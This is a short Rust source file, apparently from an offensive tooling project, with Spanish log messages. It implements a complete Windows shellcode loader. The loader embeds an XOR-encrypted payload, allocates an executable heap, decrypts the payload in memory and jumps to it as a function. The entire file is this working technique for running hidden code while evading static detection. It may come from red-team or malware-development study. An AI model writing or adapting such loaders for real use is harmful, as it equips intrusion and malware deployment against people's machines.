use std::intrinsics::copy_nonoverlapping;
use std::mem::transmute;

use winapi::ctypes::c_void;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::heapapi::{HeapAlloc, HeapCreate};
use crate::utils::xor_encrypt_decrypt;

pub fn execute_shellcode() {
    let buffer = include_bytes!("encrypted.bin");

    println!("Buffer de shellcode cargado.");

    unsafe {
        println!("Creando heap en la memoria...");
        let heap = HeapCreate(0x40000, 0, 0);
        if heap.is_null() {
            panic!("Fallo al crear el heap.");
        }

        println!("Reservando bloque de memoria en el heap...");
        let ptr = HeapAlloc(heap, 0, buffer.len());
        if ptr.is_null() {
            panic!("Fallo al reservar memoria en el heap.");
        }
        println!("Bloque de memoria reservado en la dirección: 0x{:016X}", ptr as usize);

        println!("Copiando buffer en el bloque de memoria reservado...");
        copy_nonoverlapping(buffer.as_ptr(), ptr as *mut u8, buffer.len());

        if GetLastError() == 0 {
            println!("Descifrando shellcode en la memoria...");
            xor_encrypt_decrypt(0x03, ptr, buffer.len());

            println!("Ejecutando shellcode en la dirección: 0x{:016X}", ptr as usize);
            let exec = transmute::<*mut c_void, fn()>(ptr);
            exec();

        } else {
            println!("Error detectado después de copiar el buffer.");
        }
    }
}
